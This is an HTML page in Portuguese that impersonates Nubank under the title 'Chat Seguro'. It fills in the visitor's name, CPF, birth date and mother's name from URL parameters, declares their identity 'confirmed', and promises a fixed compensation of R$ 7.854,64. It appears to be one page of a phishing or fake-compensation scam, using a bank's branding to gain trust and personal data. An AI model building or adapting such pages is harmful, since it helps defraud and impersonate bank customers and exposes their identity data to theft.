<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Chat Seguro - Nubank</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      background: #ffffff;
    }

    .iframe-wrapper {
      width: 100vw;
      height: 100vh;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    iframe {
      border: none;
      width: 100%;
      height: 100%;
      display: block;
    }
  </style>
</head>
<body>
  
 <div class="container">
    <img
      class="logo"
      src="https://i.postimg.cc/X7JSyHqM/Captura-de-tela-2025-05-30-234638.png"
      alt="Nubank"
      width="100"
    />

    <div class="divider"></div>

    <div class="info-box">
      <center>
        Sua identidade foi confirmada com sucesso! <br />
        Confira abaixo as informações cadastradas.<br />
      </center>
    </div>

    <div class="info-box">
      <b>Nome completo</b>
      <span id="nome">...</span>
    </div>

    <div class="info-box">
      <b>CPF</b>
      <span id="cpf">...</span>
    </div>

    <div class="info-box">
      <b>Data de Nascimento</b>
      <span id="nascimento">...</span>
    </div>

    <div class="info-box">
      <b>Nome da Mãe</b>
      <span id="mae">...</span>
    </div>

    <div class="info-box">
      <b>Indenização a receber</b>
      <strong>R$ 7.854,64</strong>
    </div>

    <div class="divider"></div>

    <div class="footer">
      Sistema de Verificação - Nubank<br />
      Santa Catarina
    </div>
  </div>


  <script>
    function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // Pegando as variáveis da URL
    const nome = getQueryParam('nome');
    const cpf = getQueryParam('cpf');
    const nascimento = getQueryParam('datanasc');
    const mae = getQueryParam('mae');

    // Preenchendo os elementos da página
    if (nome) document.getElementById('nome').textContent = nome;
    if (cpf) document.getElementById('cpf').textContent = cpf;
    if (nascimento) document.getElementById('nascimento').textContent = nascimento;
    if (mae) document.getElementById('mae').textContent = mae;
  </script>

</body>
</html>
